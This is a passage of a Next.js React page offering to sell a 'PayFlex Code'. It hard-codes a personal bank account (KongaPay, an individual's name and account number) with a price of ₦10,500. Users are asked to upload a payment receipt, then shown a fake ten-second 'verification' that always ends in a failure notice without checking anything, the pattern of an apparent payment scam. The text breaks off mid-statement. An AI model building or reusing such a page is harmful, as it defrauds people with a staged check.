'use client'

import React, { useState, useEffect } from 'react'
import { useRouter } from 'next/navigation'
import {
  ArrowLeft,
  Copy,
  CheckCircle2,
  Building2,
  UploadCloud,
  FileCheck,
  AlertTriangle,
  Volume2,
  Home,
  Loader2,
  Check,
  Clock,
  Headphones,
} from 'lucide-react'

export default function BuyPayFlexCodePage() {
  const router = useRouter()
  const [showWarningModal, setShowWarningModal] = useState(true)
  const [copiedAccount, setCopiedAccount] = useState(false)
  const [receiptImage, setReceiptImage] = useState<File | null>(null)
  const [previewUrl, setPreviewUrl] = useState<string | null>(null)
  
  // Verification states
  const [isVerifying, setIsVerifying] = useState(false)
  const [countdown, setCountdown] = useState(10)
  const [showFailedNotice, setShowFailedNotice] = useState(false)

  // Updated Renmoney MFB Details
  const MANUAL_BANK = {
    bankName: 'KongaPay',
    accountNumber: '1011157771',
    accountName: 'Ayodele Vincent',
    PayFlexCodeRate: '₦10,500 for the PayFlex Code',
  }

  // Handle 10-second timer
  useEffect(() => {
    let timer: NodeJS.Timeout
    if (isVerifying && countdown > 0) {
      timer = setTimeout(() => {
        setCountdown((prev) => prev - 1)
      }, 1000)
    } else if (isVerifying && countdown === 0) {
      setIsVerifying(false)
      setShowFailedNotice(true)
    }
    return () => clearInterval(timer)
  }, [isVerifying, countdown
